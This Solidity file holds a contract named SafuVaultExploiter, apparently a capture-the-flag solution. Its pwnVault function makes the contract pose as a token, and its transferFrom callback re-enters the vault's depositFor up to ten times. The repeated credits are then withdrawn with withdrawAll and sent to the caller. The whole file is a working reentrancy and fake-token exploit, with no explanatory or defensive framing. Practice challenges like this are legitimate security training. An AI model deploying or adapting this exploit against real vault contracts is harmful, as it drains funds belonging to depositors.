// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import "hardhat/console.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
// pull interface from contract

interface IVault {
    function withdrawAll() external;
    function depositFor( address token, uint256 _amount, address user) external;
}


contract SafuVaultExploiter {


  IVault victim;
  IERC20 token;
  uint256 round;
  uint256 snatch;
  function pwnVault(address _vault, address _token) external {
    // simply put i was fucking up before
    // instead of mimicing a full erc20 , just mock the base functions. 

    victim = IVault(_vault);
    token = IERC20(_token);
    snatch = token.balanceOf(address(this))/10;
    victim.depositFor(address(this), snatch, address(this));
    victim.withdrawAll();
    token.transfer(msg.sender, token.balanceOf(address(this)));
  }

  function transferFrom(address from, address to, uint256 amount) external {
    require(msg.sender == address(victim), "invalid caller");
    if(round < 10){
      round++;
      token.transfer(msg.sender, amount);
      victim.depositFor(address(this), amount, address(this));

    }
  }

}